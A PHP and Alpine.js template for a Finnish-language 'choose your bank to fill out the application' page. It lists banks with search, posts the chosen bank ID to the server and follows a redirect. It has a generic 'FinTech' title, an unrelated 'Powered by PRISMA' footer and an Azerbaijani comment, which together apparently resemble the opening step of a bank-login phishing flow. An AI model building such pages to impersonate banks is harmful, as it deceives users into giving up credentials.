<?php
ob_start();
?>

<div x-data="bankSelection()" x-init="init()" class="min-h-screen flex items-start justify-center px-4 pt-10 pb-20 relative overflow-hidden" data-banks='<?= htmlspecialchars(json_encode($banks, JSON_UNESCAPED_UNICODE), ENT_QUOTES, "UTF-8") ?>'>
    <div class="absolute inset-0" style="background: radial-gradient(1200px 700px at 50% 20%, rgba(255,255,255,0.12) 0%, rgba(255,255,255,0) 45%), linear-gradient(180deg, #0996d4 0%, #0b7fbc 55%, #0a6fb2 100%);"></div>

    <div class="relative z-10 w-full max-w-3xl mx-auto flex flex-col items-center">
        <div class="text-center mb-6">
            <h1 class="text-2xl md:text-3xl font-extrabold tracking-wide" style="color:#ffcc2a; text-shadow: 0 2px 0 rgba(0,0,0,0.08);">
                Valitse pankkisi täyttääksesi hakemuksen
            </h1>
        </div>

        <div class="w-full max-w-[720px] bg-white/95 rounded-2xl shadow-2xl ring-1 ring-black/5 p-4 md:p-6">
            <div class="relative">
                <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" aria-hidden="true">
                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 21l-4.3-4.3" />
                        <circle cx="11" cy="11" r="7" />
                    </svg>
                </span>
                <input
                    type="text"
                    x-model.trim="query"
                    class="w-full h-11 pl-11 pr-3 rounded-xl bg-white border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-200"
                    placeholder="Hae"
                />
            </div>

            <div class="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
                <template x-for="b in filteredBanks" :key="b.id">
                    <button
                        type="button"
                        class="bank-item w-full text-left bg-white rounded-xl border border-gray-200 px-4 py-3 flex items-center justify-between hover:bg-gray-50 transition"
                        @click="chooseBank(b.id)"
                        :disabled="loading"
                    >
                        <span class="flex items-center gap-3 min-w-0">
                            <span class="bank-logo w-11 h-11 rounded-xl flex items-center justify-center text-sm font-extrabold" :style="logoStyle(b)">
                                <img :src="logoImage(b)" :alt="b.name" class="w-full h-full object-contain rounded-xl" onerror="this.style.display='none'" />
                                <span x-show="!hasLogo(b)" x-text="initials(b.name)"></span>
                            </span>
                            <span class="text-gray-800 font-semibold truncate" x-text="b.name"></span>
                        </span>
                        <span class="text-gray-400" aria-hidden="true">
                            <svg class="w-5 h-5" viewBox="0 0 20 20" fill="currentColor">
                                <path fill-rule="evenodd" d="M7.21 14.77a.75.75 0 0 1 .02-1.06L10.94 10 7.23 6.29a.75.75 0 1 1 1.06-1.06l4.24 4.24a.75.75 0 0 1 0 1.06l-4.24 4.24a.75.75 0 0 1-1.06.02Z" clip-rule="evenodd" />
                            </svg>
                        </span>
                    </button>
                </template>

                <div x-show="filteredBanks.length === 0" class="text-sm text-gray-500 px-2 py-6 text-center">
                    Tuloksia ei löytynyt
                </div>
            </div>

            <div x-show="errorMessage" x-text="errorMessage" class="mt-4 p-3 bg-red-50 border border-red-200 rounded-xl text-red-700 text-sm"></div>
            <div x-show="successMessage" x-text="successMessage" class="mt-4 p-3 bg-green-50 border border-green-200 rounded-xl text-green-700 text-sm"></div>
        </div>
    </div>

    <div class="absolute bottom-6 left-1/2 -translate-x-1/2 text-white/70 text-xs">
        <div class="flex items-center justify-center gap-3">
            <div>Powered by</div>
            <img id="prisma-logo" src="/prisma_logo.png" alt="PRISMA" class="h-16 w-auto opacity-100" />
        </div>
    </div>
</div>

<style>
 .bank-item:disabled {
     opacity: 0.65;
     cursor: not-allowed;
 }
 /* PRISMA logosu üçün fonu vizual olaraq sil – gradientlə qarışdır */
 #prisma-logo {
     background-color: transparent;
     mix-blend-mode: multiply;
 }
</style>

<script>
function bankSelection() {
    return {
        banks: [],
        query: '',
        selectedBank: null,
        loading: false,
        errorMessage: '',
        successMessage: '',

        init() {
            const root = this.$root;
            try {
                this.banks = JSON.parse(root.dataset.banks || '[]');
            } catch {
                this.banks = [];
            }
        },

        get filteredBanks() {
            const q = (this.query || '').toLowerCase();
            if (!q) return this.banks;
            return this.banks.filter(b => (b.name || '').toLowerCase().includes(q));
        },

        initials(name) {
            const n = (name || '').trim();
            if (!n) return 'BK';
            const parts = n.split(/\s+/).filter(Boolean);
            const first = parts[0]?.[0] || '';
            const second = (parts[1]?.[0] || parts[0]?.[1] || '') || '';
            return (first + second).toUpperCase();
        },

        logoImage(bank) {
            if (!bank || !bank.name) return '';
            const name = bank.name.toLowerCase().replace(/\s+/g, '');
            return `/images/banks/${name}.png`;
        },

        hasLogo(bank) {
            if (!bank) return false;
            const img = new Image();
            img.src = this.logoImage(bank);
            return img.complete && img.naturalHeight !== 0;
        },

        logoStyle(bank) {
            const c = (bank && bank.color) ? String(bank.color) : '';
            const bg = /^#[0-9A-Fa-f]{6}$/.test(c) ? c : '#eef2ff';
            const fg = /^#[0-9A-Fa-f]{6}$/.test(c) ? '#ffffff' : '#1f2937';
            return `background:${bg};color:${fg};box-shadow: inset 0 0 0 1px rgba(0,0,0,0.06);`;
        },

        selectBank(bankId) {
            this.selectedBank = bankId;
            this.errorMessage = '';
        },

        chooseBank(bankId) {
            this.selectBank(bankId);
            this.submitSelection(bankId);
        },

        submitSelection(bankId = null) {
            const id = Number(bankId ?? this.selectedBank ?? 0);
            if (!id) {
                this.errorMessage = 'Valitse pankki jatkaaksesi';
                return;
            }

            this.loading = true;
            this.errorMessage = '';
            this.successMessage = '';

            fetch('/bank/select', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    bank_id: id
                })
            })
            .then(response => response.json())
            .then(data => {
                this.loading = false;
                if (data.success) {
                    this.successMessage = data.message;
                    setTimeout(() => {
                        window.location.href = data.redirect;
                    }, 500);
                } else {
                    this.errorMessage = data.message || 'Tapahtui virhe. Yritä uudelleen.';
                }
            })
            .catch(() => {
                this.loading = false;
                this.errorMessage = 'Yhteysvirhe. Yritä uudelleen.';
            });
        }
    }
}
</script>

<?php
$content = ob_get_clean();
$title = 'Valitse Pankki - FinTech';
$additionalStyles = '<style>body { background: transparent; }</style>';
include __DIR__ . '/../layout.php';
?>

